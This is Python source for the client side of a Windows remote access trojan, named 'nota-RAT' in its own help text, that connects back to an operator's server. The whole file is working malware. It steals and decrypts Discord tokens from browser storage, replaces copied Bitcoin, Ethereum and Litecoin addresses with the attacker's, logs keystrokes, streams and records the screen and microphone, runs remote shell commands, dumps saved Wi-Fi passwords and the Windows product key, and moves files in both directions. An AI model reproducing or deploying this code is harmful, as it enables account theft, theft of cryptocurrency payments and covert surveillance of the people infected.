import socket, argparse, os, time, subprocess, re, cv2, pyautogui, datetime, asyncio, httpx, requests, json, pyperclip
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
from win32 import win32api
from threading import Thread
from cryptography.fernet import Fernet
from vidstream import ScreenShareClient
from pynput.keyboard import Key, Listener
from base64 import b64decode
from win32 import win32crypt
from Crypto.Cipher import AES


parser = argparse.ArgumentParser(description="nota-RAT, python reverse shell using sockets.")
parser.add_argument("host", default= "127.0.0.1", nargs="?", help="Address of the Server.")
parser.add_argument("-p", "--port", default=421, help="Port the Server is running on.", type=int)


''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'

''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
INFO = f'{MAIN}Info{END}'



class get_token():
    def get_token(cs, self):
        global dec
        user = os.getlogin()
        self.tokens = []
        roa = fr"C:\Users\{user}\AppData\Roaming"
        loc = fr"C:\Users\{user}\AppData\Local"
        self.paths = [f"Discord|{roa}\\discord\\Local Storage\\leveldb\\",f"Discord Canary|{roa}\\discordcanary\\Local Storage\\leveldb\\",f"Lightcord|{roa}\\Lightcord\\Local Storage\\leveldb\\",f"Discord PTB|{roa}\\discordptb\\Local Storage\\leveldb\\",f"Brave|{loc}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",f"Opera|{roa}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",f"Opera GX|{roa}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",f"Microsoft Edge|{loc}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge2|{loc}\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge3|{loc}\\Microsoft\\Edge\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Microsoft Edge4|{loc}\\Microsoft\\Edge\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Microsoft Edge5|{loc}\\Microsoft\\Edge\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Microsoft Edge6|{loc}\\Microsoft\\Edge\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Microsoft Edge7|{loc}\\Microsoft\\Edge\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Microsoft Edge8|{loc}\\Microsoft\\Edge\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Microsoft Edge9|{loc}\\Microsoft\\Edge\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome|{loc}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",f"Chrome1|{loc}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Chrome2|{loc}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Chrome3|{loc}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Chrome4|{loc}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Chrome5|{loc}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Chrome6|{loc}\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Chrome7|{loc}\\Google\\Chrome\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Chrome8|{loc}\\Google\\Chrome\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Chrome9|{loc}\\Google\\Chrome\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome10|{loc}\\Google\\Chrome\\User Data\\Profile 10\\Local Storage\\leveldb\\"]
        roa = fr"C:\Users\{user}\AppData\Roaming"
        for i in self.paths:
            path = i.split("|")[1]
            name = i.split("|")[0].replace(" ","").lower()
            if "ord" in path:
                self.enc_regex(name, path, roa)
            else:
                self.regex(path)
        dec = str('|||'.join(self.tokens))
        cs.send(dec.encode())


    def regex(self, path):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", l):
                            try:
                                v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                if v.status_code == 200:
                                    if token not in self.tokens:
                                        self.tokens.append(token)
                            except:pass
        except:pass
    def enc_regex(self, name, path, roa):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for I in re.findall(r"dQw4w9WgXcQ:[^\"]*", l):
                            try:
                                returned_key = self.KEY(roa+f'\\{name}\\Local State')
                                token = self.dec(b64decode(I.split('dQw4w9WgXcQ:')[1]),returned_key)
                                try:
                                    v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                    if v.status_code == 200:
                                        if token not in self.tokens:
                                            self.tokens.append(token)
                                except:pass          
                            except:pass
        except:pass
    def KEY(self, path):
        ls = json.loads(open(path,'r',encoding='utf-8').read())
        master_key = win32crypt.CryptUnprotectData(b64decode(ls["os_crypt"]["encrypted_key"])[5:],None,None,None, 0)[1]
        return master_key
    def dec(self, buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(payload)[:-16].decode()
            return dec
        except:pass
        

class Functions(object):
    @staticmethod    
    def crypto_swapper_loop(BTC, ETH, LTC, ADDYS, BTCRE, ETHRE, LTCRE, host, running):
        CRYPTO_HOST = host 
        CRYPTO_PORT = 427
        c = socket.socket()
        c.connect((CRYPTO_HOST, CRYPTO_PORT)) 
        def checkAddy(text:str):
            if not text.strip() in ADDYS:
                isAddy=False
                Type=0
                if re.search(BTCRE, text):
                    isAddy=True
                    Type=1
                elif re.search(ETHRE, text):
                    isAddy=True
                    Type=2
                elif re.search(LTCRE, text):
                    isAddy=True
                    Type=3
                else:
                    pass
                return isAddy, Type
            else: return None, None

        while running:
            time.sleep(3)
            isAddy, Type = checkAddy(pyperclip.paste())
            if isAddy:
                if Type == 1:
                    pyperclip.copy(BTC)
                elif Type == 2:
                    pyperclip.copy(ETH)
                else:
                    pyperclip.copy(LTC)
                c.send((f"{Type}").encode())
            else:pass     
    @staticmethod
    def exit_tm(self):
        self.running = False
        os._exit(0)
    @staticmethod
    def start_live(self):
        self.sender = ScreenShareClient(self.args.host, self.sender_port)
        p = Thread(target=self.sender.start_stream)
        p.start()
    @staticmethod
    def stop_live(self):
        self.sender.stop_stream()
        self.sender_port = 424
    @staticmethod
    def start_keylogger(command, host):
        LOGGER_HOST = host 
        LOGGER_PORT = 422
        logger = socket.socket()
        logger.connect((LOGGER_HOST, LOGGER_PORT))  
        wordz = str()   
        def press(key):
            nonlocal wordz
            wordz += str(key)
            if key == Key.space or key == Key.enter:
                contents = f"\n{wordz}\n"
                contents = contents.replace("'", "")
                contents = contents.replace("Key.space", "")
                contents = contents.replace("Key.backspace", "")
                contents = contents.replace("Key.shift", "")
                contents = contents.replace("Key.alt", "")
                contents = contents.replace("Key.enter", "")
                contents = contents.replace("Key.alt_gr", "")
                contents = contents.replace("Key.alt_l", "")
                contents = contents.replace("Key.alt_r", "")
                contents = contents.replace("Key.caps_lock", "")
                contents = contents.replace("Key.cmd", "")
                contents = contents.replace("Key.cmd_l", "")
                contents = contents.replace("Key.cmd_r", "")
                contents = contents.replace("Key.ctrl", "")
                contents = contents.replace("Key.ctrl_l", "")
                contents = contents.replace("Key.ctrl_r", "")
                contents = contents.replace("Key.delete", "")
                contents = contents.replace("Key.down", "")
                contents = contents.replace("Key.end", "")
                contents = contents.replace("Key.esc", "")
                contents = contents.replace("Key.f1", "")
                contents = contents.replace("Key.f2", "")
                contents = contents.replace("Key.f3", "")
                contents = contents.replace("Key.f4", "")
                contents = contents.replace("Key.f5", "")
                contents = contents.replace("Key.f6", "")
                contents = contents.replace("Key.f7", "")
                contents = contents.replace("Key.f8", "")
                contents = contents.replace("Key.f9", "")
                contents = contents.replace("Key.f10", "")
                contents = contents.replace("Key.f11", "")
                contents = contents.replace("Key.f12", "")
                contents = contents.replace("Key.f13", "")
                contents = contents.replace("Key.f14", "")
                contents = contents.replace("Key.f15", "")
                contents = contents.replace("Key.f16", "")
                contents = contents.replace("Key.f17", "")
                contents = contents.replace("Key.f18", "")
                contents = contents.replace("Key.f19", "")
                contents = contents.replace("Key.f20", "")
                contents = contents.replace("Key.home", "")
                contents = contents.replace("Key.insert", "")
                contents = contents.replace("Key.left", "")
                contents = contents.replace("Key.menu", "")
                contents = contents.replace("Key.num_lock", "")
                contents = contents.replace("Key.page_down", "")
                contents = contents.replace("Key.page_up", "")
                contents = contents.replace("Key.pause", "")
                contents = contents.replace("Key.print_screen", "")
                contents = contents.replace("Key.scroll_lock", "")
                contents = contents.replace("Key.right", "")
                contents = contents.replace("Key.shift_l", "")
                contents = contents.replace("Key.shift_r", "")
                contents = contents.replace("Key.tab", "")
                contents = contents.replace("Key.up", "")
                date_now = str(datetime.datetime.now())
                contents =  "\n" + date_now + contents
                logger.send(contents.encode())
                wordz = str()
        while True:
            if command == "stop keylogger":
                logger.close()
                break
            with Listener(
                    on_press=press,) as listener:
                listener.join()
    @staticmethod
    def take_screenshot(self):
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        cv2.imwrite("screenshot.png", image)
        filename = "screenshot.png"
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                self.s.send(dataLen.to_bytes(4,'big'))
                self.s.send(data)
            f.close()
        os.remove("screenshot.png")
    @staticmethod
    def record_screen(self):
        time_stop = self.s.recv(self.BUFFER_SIZE).decode()
        time_stop = int(time_stop)
        def record_screen_loop():
            RECORD_HOST = self.args.host 
            RECORD_PORT = 426
            r = socket.socket()
            r.connect((RECORD_HOST, RECORD_PORT)) 
            SCREEN_SIZE = (win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1))
            fource = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('recording.mp4', fource, 10.0, (SCREEN_SIZE))
            fps = 20
            prev = 0
            start = time.time()
            while True:
                if time.time() > start + time_stop: 
                    cv2.destroyAllWindows()
                    out.release()
                    break
                time_elapsed = time.time()-prev
                img = pyautogui.screenshot()
                if time_elapsed > 1.0/fps:
                    prev = time.time()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    out.write(frame)
            filename = "recording.mp4"
            if filename in os.listdir():
                with open(filename, "rb") as f:
                    data = f.read()
                    dataLen = len(data)
                    r.send(dataLen.to_bytes(4,'big'))
                    r.send(data)
                f.close()
            os.remove("recording.mp4")
        record_mic_loopz = Thread(target=record_screen_loop)
        record_mic_loopz.daemon = True
        record_mic_loopz.start()
    @staticmethod
    def send_command(self):
        cwd = os.getcwd()
        self.s.send(cwd.encode())
        new_command = self.s.recv(self.BUFFER_SIZE).decode()
        splited_command = new_command.split()
        if splited_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        else:
            output = subprocess.getoutput(new_command)
        message = f"\r{GREEN}{output}{END}{self.SEPARATOR}{cwd}"
        self.s.send(message.encode())
    @staticmethod
    def send_commands(self):
        running = True
        cwd = os.getcwd()
        self.s.send(cwd.encode())
        while running:
            new_command = self.s.recv(self.BUFFER_SIZE).decode()
            splited_command = new_command.split()
            if new_command == "exit":
                break
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            else:
                output = subprocess.getoutput(new_command)
            cwd = os.getcwd()
            message = f"\r{GREEN}{output}{END}{self.SEPARATOR}{cwd}"
            self.s.send(message.encode())
    @staticmethod
    def record_mic(self):
        fs = 44100
        seconds = self.s.recv(self.BUFFER_SIZE).decode()
        seconds = int(seconds)
        self.s.recv(self.BUFFER_SIZE).decode()
        def record_mic_loop():
            MIC_HOST = self.args.host 
            MIC_PORT = 425
            m = socket.socket()
            m.connect((MIC_HOST, MIC_PORT)) 
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write('output.wav', fs, myrecording)
            filename = "output.wav"
            if filename in os.listdir():
                with open(filename, "rb") as f:
                    data = f.read()
                    dataLen = len(data)
                    m.send(dataLen.to_bytes(4,'big'))
                    m.send(data)
                f.close()
            os.remove(filename)
        record_mic_loopz = Thread(target=record_mic_loop)
        record_mic_loopz.daemon = True
        record_mic_loopz.start()
    @staticmethod
    def get_wifi(self):
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

        wifi_list = []
        wifi_list_profiles = str()
    
        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profile = {}
                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile) 
        if wifi_list == []:
            self.s.send((f"[{IMPORTANT}] no wifi profiles found{END}").encode())   
        if wifi_list != []:
            for x in range(len(wifi_list)):
                wifi_list_new = f"[{INFO}] {wifi_list[x]}\n"
                wifi_list_profiles = wifi_list_profiles + wifi_list_new
            self.s.send((wifi_list_profiles).encode())
    @staticmethod
    def get_file(self):
        filename = self.s.recv(self.BUFFER_SIZE).decode()
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                self.s.send(dataLen.to_bytes(4,'big'))
                self.s.send(data)
            f.close()
    @staticmethod
    def send_file(self):
        filename = self.s.recv(self.BUFFER_SIZE).decode()
        remaining = int.from_bytes(self.s.recv(4),'big')
        f = open(filename,"wb")
        while remaining:
            data = self.s.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    @staticmethod
    def system_info(self) -> list:
        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            HWID = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
        except Exception:
            HWID = "N/A"
        try:
            wkey = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
        except Exception:
            wkey = "N/A"
        try:
            winver = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
        except Exception:
            winver = "N/A"
        self.s.send(f"{HWID}{self.SEPARATOR}{wkey}{self.SEPARATOR}{winver}".encode())
    @staticmethod
    def network_info(self) -> list:
        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        self.s.send(f"{ip}{self.SEPARATOR}{city}{self.SEPARATOR}{country}{self.SEPARATOR}{region}{self.SEPARATOR}{org}{self.SEPARATOR}{loc}{self.SEPARATOR}{googlemap}".encode())
        


class Main(Functions, get_token):
    def __init__(self):
        self.running = True
        self.args = parser.parse_args()
        self.SERVER_HOST = self.args.host
        self.SERVER_PORT = self.args.port
        self.BUFFER_SIZE = 1024 * 128 
        self.SEPARATOR = "<sep>"
        self.keyz = Fernet.generate_key()
        self.secret_key = self.keyz
        self.sender_port = 424
        self.s = socket.socket()
        self.s.connect((self.SERVER_HOST, self.SERVER_PORT))
        self.BTC ,self.ETH, self.LTC = self.s.recv(self.BUFFER_SIZE).decode().split(self.SEPARATOR)
        self.ADDYS=[self.BTC, self.ETH, self.LTC]
        self.BTCRE=re.compile("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")
        self.ETHRE=re.compile("^0x[a-fA-F0-9]{40}$")
        self.LTCRE=re.compile("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$")
        Thread(target=Functions.crypto_swapper_loop, args=(self.BTC, self.ETH, self.LTC, self.ADDYS, self.BTCRE, self.ETHRE, self.LTCRE, self.args.host, self.running)).start()

        while True:
            self.command = self.s.recv(self.BUFFER_SIZE).decode()
            if self.command == "exit":
                Functions.exit_tm(self)
            if self.command == "get token":
                get_token.get_token(self.s, self)
            if self.command == "get sysinfo":
                Functions.system_info(self)
            if self.command == "get netinfo":
                Functions.network_info(self)
            if self.command == "get live":
                Functions.start_live(self)
            if self.command == "stop live":
                Functions.stop_live(self)
            if self.command == "start keylogger":
                Thread(target=Functions.start_keylogger, args=(self.command, self.args.host)).start()
            if self.command == "take screenshot":
                Functions.take_screenshot(self)
            if self.command == "record screen":
                Functions.record_screen(self)
            if self.command == "send command":
                Functions.send_command(self)
            if self.command == "send commands":
                Functions.send_commands(self)
            if self.command == "record mic":
                Functions.record_mic(self)
            if self.command == "get wifi":
                Functions.get_wifi(self)
            if self.command == "get file":
                Functions.get_file(self)
            if self.command == "send file":
                Functions.send_file(self)
         
                
if __name__ == "__main__" and os.name == "nt":
    try:
        httpx.get('https://google.com')
    except (httpx.NetworkError, httpx.TimeoutException):
        os._exit(0)
    asyncio.run(Main().init())